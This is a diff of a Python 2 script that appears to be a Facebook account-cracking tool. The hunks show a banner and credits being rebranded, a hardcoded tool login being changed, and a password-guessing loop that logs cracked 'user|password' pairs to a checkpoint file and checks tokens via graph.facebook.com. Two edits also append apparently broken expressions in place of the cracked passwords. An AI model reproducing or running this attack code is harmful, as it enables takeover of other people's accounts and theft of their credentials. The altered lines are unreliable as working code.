@@ -83,7 +83,7 @@ logo = """ ▄︻┻═┳一 ЩєLc๏Mє ┼๏ ┼ђє Fąş┼єş┼ єVєr
 \033[1;96mAuthor  \033[1;93m: \033[1;92mKomail Khan
 \033[1;96mInstagram \033[1;93m: \033[1: itx_muskan_yr
 \033[1;96mFacebook  \033[1;93m: \033[1: komail.khan.3781
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/KomailKhan/komailkhan
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/umair3737/Umii.git
 \033[1;91m======================================="""
 
 def tik():
@@ -130,8 +130,8 @@ print  """\033[1;91m
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "komail"
-CorrectPassword = "khan"
+CorrectUsername = "dj"
+CorrectPassword = "umii"
 
 loop = 'true'
 while (loop == 'true'):
@@ -427,7 +427,7 @@ def pilih_super():
 															cek = open("out/checkpoint.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
-															cekpoint.append(user+pass6)
+															cekpoint.append(user+lastname12345)
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
@@ -436,7 +436,7 @@ def pilih_super():
 															q = json.load(data)
 															if 'access_token' in q:
 																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-																oks.append(user+pass7)
+																oks.append(user+786786)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
 																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
